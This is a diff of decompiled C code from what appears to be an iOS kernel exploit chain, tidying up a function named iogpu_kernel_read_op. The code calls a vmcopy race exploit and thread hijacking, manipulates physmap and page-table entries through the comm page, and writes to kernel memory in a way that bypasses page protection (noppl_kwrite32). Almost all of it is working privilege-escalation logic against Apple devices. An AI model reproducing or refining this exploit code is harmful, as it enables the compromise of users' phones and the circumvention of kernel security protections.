@@ -76,6 +76,17 @@ static inline kern_return_t iogpu_map_memory_entry_fixed(vm_address_t *address, 
   return vm_map(mach_task_self_, address, 0x4000u, 0, 0x4000, port, 0, 0, 3, 3, 1u);
 }
 
+typedef struct PgtableWalkInfo
+{
+  uint64_t tableKva;
+  uint64_t pageBase;
+  uint32_t pageSize;
+  uint32_t kindAndFlags;
+  uint32_t prot;
+  uint32_t reserved;
+  uint64_t descriptor;
+} PgtableWalkInfo;
+
 //----- (00000000000068F4) ----------------------------------------------------
 void __fastcall deallocate_physmap_pages(__int64 a1)
 {
@@ -2883,180 +2894,166 @@ void memory_barrier_dsb_isb()
 //----- (000000000000B768) ----------------------------------------------------
 __int64 __fastcall iogpu_kernel_read_op(struct_krwCtx *krwCtx, unsigned __int64 a2, int a3)
 {
-  __int64 v6; // x24
-  __int64 v7; // x22
-  __int64 v8; // x8
-  unsigned __int64 v9; // x23
-  int v10; // w0
-  __int64 v11; // x24
-  int v12; // w0
+  __int64 fallbackError; // x24
+  __int64 status; // x22
   unsigned __int64 port_kaddr; // x0
-  unsigned __int64 v15; // x0
-  int v16; // w0
-  int v17; // w0
-  __int64 v18; // x0
-  __int64 v19; // x24
-  __int64 v20; // x27
-  __int64 v21; // x22
-  __int16 v22; // w26
-  int v23; // w0
-  __int64 v24; // x8
-  int v25; // [xsp+4h] [xbp-3ACh] BYREF
-  unsigned __int64 v26[5]; // [xsp+8h] [xbp-3A8h] BYREF
-  uint64_t v27[5]; // [xsp+30h] [xbp-380h] BYREF
-  uint64_t v28[2]; // [xsp+58h] [xbp-358h] BYREF
-  int v29; // [xsp+68h] [xbp-348h]
-  uint64_t *v30[3]; // [xsp+70h] [xbp-340h] BYREF
+  unsigned __int64 aliasPage; // x23
+  __int64 mappedKernelRegion; // x8
+  int physAllocSize; // [xsp+4h] [xbp-3ACh] BYREF
+  PgtableWalkInfo secondAliasWalk; // [xsp+8h] [xbp-3A8h] BYREF
+  PgtableWalkInfo firstAliasWalk; // [xsp+30h] [xbp-380h] BYREF
+  struct
+  {
+    uint64_t scanCtx;
+    uint64_t vmcopyCtx;
+    int flags;
+  } hijackArgs; // [xsp+58h] [xbp-358h] BYREF
+  uint64_t *sectionCtx[3]; // [xsp+70h] [xbp-340h] BYREF
   uint64_t kernelScanCtx[5]; // [xsp+88h] [xbp-328h] BYREF
-  uint64_t v34[2]; // [xsp+B0h] [xbp-300h] BYREF
-  char v35; // [xsp+C4h] [xbp-2ECh]
-  unsigned __int64 v36; // [xsp+D0h] [xbp-2E0h]
+  union
+  {
+    struct
+    {
+      uint64_t dispatchTable;
+      uint64_t scanCtx;
+    } vmcopy;
+    PgtableWalkInfo walk;
+  } vmcopyOrWalk; // [xsp+B0h] [xbp-300h] BYREF
 
-  memset(v26, 0, sizeof(v26));
-  memset(v27, 0, sizeof(v27));
-  memset(v34, 0, sizeof(v34));
-  v35 = 0;
-  v36 = 0;
-  v6 = 708619;
+  memset(&secondAliasWalk, 0, sizeof(secondAliasWalk));
+  memset(&firstAliasWalk, 0, sizeof(firstAliasWalk));
+  memset(&vmcopyOrWalk.walk, 0, sizeof(vmcopyOrWalk.walk));
+  fallbackError = 708619;
   if ( !(unsigned int)acquire_write_semaphore_lock(krwCtx, 7u, 0x2710u) )
   {
-    v8 = *(uint64_t *)&krwCtx->mappedKernelRegion;
-    if ( v8 )
+    mappedKernelRegion = *(uint64_t *)&krwCtx->mappedKernelRegion;
+    if ( mappedKernelRegion && *(uint64_t *)&krwCtx->mappedKernelSize )
     {
-      if ( *(uint64_t *)&krwCtx->mappedKernelSize )
-      {
-        v9 = *(uint64_t *)(v8 + 344);
-        if ( v9 )
-          goto LABEL_6;
-      }
+      aliasPage = *(uint64_t *)(mappedKernelRegion + 344);
+      if ( aliasPage )
+        goto WRITE_WITH_ALIAS_PAGE;
     }
-    v30[2] = kernelScanCtx;
-    v34[0] = off_448E0;
-    v34[1] = kernelScanCtx;
-    v12 = parse_xnu_version_string((__int64)&qword_480D8);
-    if ( !v12 )
+
+    sectionCtx[2] = kernelScanCtx;
+    vmcopyOrWalk.vmcopy.dispatchTable = (uint64_t)off_448E0;
+    vmcopyOrWalk.vmcopy.scanCtx = (uint64_t)kernelScanCtx;
+    if ( !(unsigned int)parse_xnu_version_string((__int64)&qword_480D8) )
     {
-      v7 = 163878;
+      status = 163878;
       kernelScanCtx[4] = (uint64_t)krwCtx;
       scan_for_macho_header(kernelScanCtx, krwCtx->gap_0x19D0);
       port_kaddr = get_task_kobject_addr(krwCtx, mach_task_self_);
       kernelScanCtx[2] = port_kaddr;
-      if ( port_kaddr && (kernelScanCtx[3] = kreadptr(krwCtx, port_kaddr)) != 0 )
+      if ( !port_kaddr || (kernelScanCtx[3] = kreadptr(krwCtx, port_kaddr)) == 0 )
       {
-        if ( !(unsigned int)init_text_exec_data_const_sections(v30) && !(unsigned int)setup_iokit_notify_dispatch(&qword_48000, v30) )
+        fallbackError = 163867;
+      }
+      else if ( !(unsigned int)init_text_exec_data_const_sections(sectionCtx)
+             && !(unsigned int)setup_iokit_notify_dispatch(&qword_48000, sectionCtx) )
+      {
+        hijackArgs.scanCtx = (uint64_t)kernelScanCtx;
+        hijackArgs.vmcopyCtx = (uint64_t)&vmcopyOrWalk;
+        hijackArgs.flags = 0;
+        if ( (unsigned int)exploit_thread_vmcopy_race((__int64)&vmcopyOrWalk)
+          || (unsigned int)krw_ctx_setup_physmap((__int64)&gPhysmapGadgets, sectionCtx, (__int64)kernelScanCtx)
+          || (unsigned int)thread_hijack_exploit((__int64)&hijackArgs) )
         {
-          if ( (unsigned int)exploit_thread_vmcopy_race((__int64)v34)
-            || (unsigned int)krw_ctx_setup_physmap((__int64)&gPhysmapGadgets, v30, (__int64)kernelScanCtx)
-            || (v28[0] = kernelScanCtx, v28[1] = v34, v29 = 0, (unsigned int)thread_hijack_exploit((__int64)v28)) )
+          get_ppnum_via_kread((__int64)&vmcopyOrWalk);
+          status = 708619;
+          goto RELEASE_LOCK;
+        }
+
+        get_ppnum_via_kread((__int64)&vmcopyOrWalk);
+        physAllocSize = 2 * krwCtx->pageSizeOrSomething;
+        aliasPage = alloc_physmap_page(krwCtx, (unsigned int *)&physAllocSize);
+        if ( !aliasPage )
+        {
+          status = 708617;
+          goto RELEASE_LOCK;
+        }
+        if ( !pgtable_walk_wrapper(krwCtx, aliasPage, &firstAliasWalk) )
+          goto RELEASE_LOCK;
+        if ( !pgtable_walk_wrapper(krwCtx, aliasPage + krwCtx->pageSizeOrSomething, &secondAliasWalk) )
+          goto RELEASE_LOCK;
+
+        __int64 mappedSecondAliasPage = map_physpage_for_kobj(krwCtx, secondAliasWalk.tableKva);
+        if ( !mappedSecondAliasPage )
+          goto RELEASE_LOCK;
+
+        uint64_t pageMask = krwCtx->pageMask;
+        if ( pgtable_walk_wrapper(krwCtx, firstAliasWalk.tableKva & ~pageMask, &vmcopyOrWalk.walk)
+          && (vmcopyOrWalk.walk.descriptor & 0xFFFFFFFFC000LL) != 0 )
+        {
+          uint64_t savedCommPagePte = MEMORY[0x400000008];
+          uint64_t commPagePte = (savedCommPagePte & 0xFFFF000000003FFFLL)
+                               | (vmcopyOrWalk.walk.descriptor & 0xFFFFFFFFC000LL);
+          MEMORY[0x400000008] = commPagePte;
+          memory_barrier_dsb_isb();
+          semaphore_timedwait_ns(krwCtx, 0x2710u);
+          *(uint64_t *)((firstAliasWalk.tableKva & 0x3FFF) | 0x400004000LL) =
+            (firstAliasWalk.descriptor & 0xFFFF000000003FFFLL)
+          | ((((mappedSecondAliasPage & (unsigned __int64)~pageMask) >> 14) & 0x3FFFFFFFFLL) << 14);
+          memory_barrier_dsb_isb();
+          MEMORY[0x400000008] = savedCommPagePte;
+          semaphore_timedwait_ns(krwCtx, 0x2710u);
+          mappedKernelRegion = *(uint64_t *)&krwCtx->mappedKernelRegion;
+          if ( mappedKernelRegion && *(uint64_t *)&krwCtx->mappedKernelSize )
+            *(uint64_t *)(mappedKernelRegion + 344) = aliasPage;
+          goto WRITE_WITH_ALIAS_PAGE;
+        }
+        status = 708619;
+        goto RELEASE_LOCK;
+      }
+    }
+    status = fallbackError;
+    goto RELEASE_LOCK;
+
+WRITE_WITH_ALIAS_PAGE:
+    status = 163878;
+    if ( pgtable_walk_wrapper(krwCtx, a2, &vmcopyOrWalk.walk) )
+    {
+      if ( (uint8_t)vmcopyOrWalk.walk.kindAndFlags == 3 )
+      {
+        uint64_t aliasPteSlot =
+          aliasPage + 8 * (((krwCtx->pageSizeOrSomething + (uint32_t)aliasPage) & 0x1FFFFFFu)
+                         / krwCtx->pageSizeOrSomething);
+        if ( (unsigned int)krw_read_thunk(krwCtx, aliasPteSlot, 8, kernelScanCtx) )
+        {
+          uint64_t retargetedPte =
+            (kernelScanCtx[0] & 0xFFFF000000003FFFLL)
+          | (((vmcopyOrWalk.walk.descriptor >> 14) & 0x3FFFFFFFFLL) << 14);
+          if ( retargetedPte == kernelScanCtx[0]
+            || (unsigned int)kwrite_with_retry(krwCtx, aliasPteSlot, (__int64)&retargetedPte, 8) )
           {
-            get_ppnum_via_kread((__int64)v34);
+            if ( retargetedPte != kernelScanCtx[0] )
+              semaphore_timedwait_ns(krwCtx, 0x2710u);
+            if ( noppl_kwrite32(krwCtx, aliasPage + krwCtx->pageSizeOrSomething + (krwCtx->pageMask & a2), a3) )
+              status = 0;
+            else
+              status = 163856;
           }
           else
           {
-            get_ppnum_via_kread((__int64)v34);
-            v25 = 2 * krwCtx->pageSizeOrSomething;
-            v15 = alloc_physmap_page(krwCtx, (unsigned int *)&v25);
-            if ( !v15 )
-            {
-              v7 = 708617;
-              goto LABEL_27;
-            }
-            v9 = v15;
-            v16 = pgtable_walk_wrapper(krwCtx, v15, v27);
-            if ( !v16 )
-              goto LABEL_27;
-            v17 = pgtable_walk_wrapper(krwCtx, v9 + krwCtx->pageSizeOrSomething, v26);
-            if ( !v17 )
-              goto LABEL_27;
-            v18 = map_physpage_for_kobj(krwCtx, v26[0]);
-            if ( !v18 )
-              goto LABEL_27;
-            v19 = v18;
-            v20 = krwCtx->pageMask;
-            v21 = v27[4];
-            v22 = v27[0];
-            v23 = pgtable_walk_wrapper(krwCtx, v27[0] & ~v20, v34);
-            if ( v23 && (v36 & 0xFFFFFFFFC000LL) != 0 )
-            {
-              v30[0] = (uint64_t *)MEMORY[0x400000008];
-              kernelScanCtx[0] = (MEMORY[0x400000008] & 0xFFFF000000003FFFLL) | (v36 & 0xFFFFFFFFC000LL);
-              MEMORY[0x400000008] = kernelScanCtx[0];
-              memory_barrier_dsb_isb();
-              semaphore_timedwait_ns(krwCtx, 0x2710u);
-              *(uint64_t *)((v22 & 0x3FFF) | 0x400004000LL) = (v21 & 0xFFFF000000003FFFLL)
-                                                        | ((((v19 & (unsigned __int64)~v20) >> 14) & 0x3FFFFFFFFLL) << 14);
-              memory_barrier_dsb_isb();
-              MEMORY[0x400000008] = v30[0];
-              semaphore_timedwait_ns(krwCtx, 0x2710u);
-              v24 = *(uint64_t *)&krwCtx->mappedKernelRegion;
-              if ( v24 && *(uint64_t *)&krwCtx->mappedKernelSize )
-                *(uint64_t *)(v24 + 344) = v9;
-LABEL_6:
-              v7 = 163878;
-              v10 = pgtable_walk_wrapper(krwCtx, a2, v34);
-              if ( v10 )
-              {
-                if ( v35 == 3 )
-                {
-                  v11 = v9 + 8 * (((krwCtx->pageSizeOrSomething + (uint32_t)v9) & 0x1FFFFFFu) / krwCtx->pageSizeOrSomething);
-                  if ( (unsigned int)krw_read_thunk(krwCtx, v11, 8, kernelScanCtx) )
-                  {
-                    v27[0] = (kernelScanCtx[0] & 0xFFFF000000003FFFLL) | (((v36 >> 14) & 0x3FFFFFFFFLL) << 14);
-                    if ( v27[0] == kernelScanCtx[0] )
-                      goto LABEL_12;
-                    if ( (unsigned int)kwrite_with_retry(krwCtx, v11, (__int64)v27, 8) )
-                    {
-                      semaphore_timedwait_ns(krwCtx, 0x2710u);
-LABEL_12:
-                      if ( noppl_kwrite32(
-                             krwCtx,
-                             v9 + krwCtx->pageSizeOrSomething + (krwCtx->pageMask & a2),
-                             a3) )
-                      {
-                        v7 = 0;
-                      }
-                      else
-                      {
-                        v7 = 163856;
-                      }
-                      goto LABEL_27;
-                    }
-                    v7 = 163856;
-                  }
-                  else
-                  {
-                    v7 = 163855;
-                  }
-                }
-                else
-                {
-                  v7 = 163857;
-                }
-              }
-LABEL_27:
-              release_write_semaphore_lock(krwCtx, 7u);
-              return v7;
-            }
+            status = 163856;
           }
-          v7 = 708619;
-          goto LABEL_27;
+        }
+        else
+        {
+          status = 163855;
         }
       }
       else
       {
-        v6 = 163867;
+        status = 163857;
       }
     }
-    v7 = v6;
-    goto LABEL_27;
+
+RELEASE_LOCK:
+    release_write_semaphore_lock(krwCtx, 7u);
+    return status;
   }
   return 708642;
 }
-// B7FC: variable 'v10' is possibly undefined
-// B8D8: variable 'v12' is possibly undefined
-// BA3C: variable 'v16' is possibly undefined
-// BA54: variable 'v17' is possibly undefined
-// BA88: variable 'v23' is possibly undefined
 // 448E0: using guessed type __int64 (__fastcall *off_448E0[7])();
 
 //----- (000000000000BB3C) ----------------------------------------------------
